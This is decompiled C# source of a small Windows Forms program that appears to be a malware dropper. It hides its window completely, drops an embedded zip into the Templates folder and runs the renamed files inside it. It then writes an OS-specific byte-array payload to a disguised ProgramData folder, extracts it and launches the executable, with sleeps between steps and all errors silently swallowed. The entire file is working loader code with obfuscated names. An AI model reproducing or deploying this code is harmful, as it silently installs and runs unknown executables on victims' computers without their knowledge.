using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using intdharrnik.My.Resources;

namespace intdharrnik;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	public void undofile(string zip_n2ame, string app_tdir)
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(Type.GetTypeFromProgID("Shell.Application")));
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "NameSpace", new object[1] { app_tdir }, (string[])null, (Type[])null, (bool[])null));
			object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "NameSpace", new object[1] { zip_n2ame + ".zip" }, (string[])null, (Type[])null, (bool[])null));
			NewLateBinding.LateCall(objectValue2, (Type)null, "CopyHere", new object[2]
			{
				RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null)),
				4
			}, (string[])null, (Type[])null, (bool[])null, true);
			File.Delete(zip_n2ame + ".zip");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public void UnrdZirp()
	{
		try
		{
			string text = "\\HPathvwra\\";
			string text2 = "othvidtiraw";
			string text3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + text;
			myvpc myvpc2 = new myvpc();
			string text4 = Environment.OSVersion.ToString();
			string[] source = ((!(text4.Contains("6.1") | text4.Contains("6.01"))) ? ((string[])myvpc2.w8()) : ((string[])myvpc2.w7()));
			byte[] bytes = source.Select((string s) => byte.Parse(s)).ToArray();
			if (!Directory.Exists(text3))
			{
				Directory.CreateDirectory(text3);
			}
			string text5 = text3 + text2;
			if (!File.Exists(text5))
			{
				File.WriteAllBytes(text5 + ".zip", bytes);
			}
			if (!File.Exists(text5 + ".exe".ToString()))
			{
				undofile(text5, text3);
			}
			Thread.Sleep(410);
			Process.Start(text5 + ".exe".ToString());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public void open_files(string fil_path)
	{
		//Discarded unreachable code: IL_007b
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(fil_path);
			FileInfo[] files = directoryInfo.GetFiles("*.ford");
			FileInfo[] array = files;
			int num = 0;
			if (num < array.Length)
			{
				FileInfo fileInfo = array[num];
				string text = fil_path + "\\\\" + fileInfo.get_Name().Replace(".ford", "").Replace("$", ".");
				File.WriteAllBytes(text, File.ReadAllBytes(fileInfo.FullName));
				Process.Start(text);
				File.Delete(fileInfo.FullName);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public void dbsrualbmloadrMde()
	{
		try
		{
			string text = Path.GetFileName(Application.get_ExecutablePath())!.Split(new char[1] { '.' })[0];
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\";
			string text3 = text2 + text;
			if (!File.Exists(text3 + ".zip"))
			{
				File.WriteAllBytes(text3 + ".zip", Resources.intdharrnik);
			}
			undofile(text3, text2);
			open_files(text2);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Thread.Sleep(810);
		dbsrualbmloadrMde();
		Thread.Sleep(5010);
		UnrdZirp();
		Thread.Sleep(10120);
		try
		{
			((Form)this).Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}
}
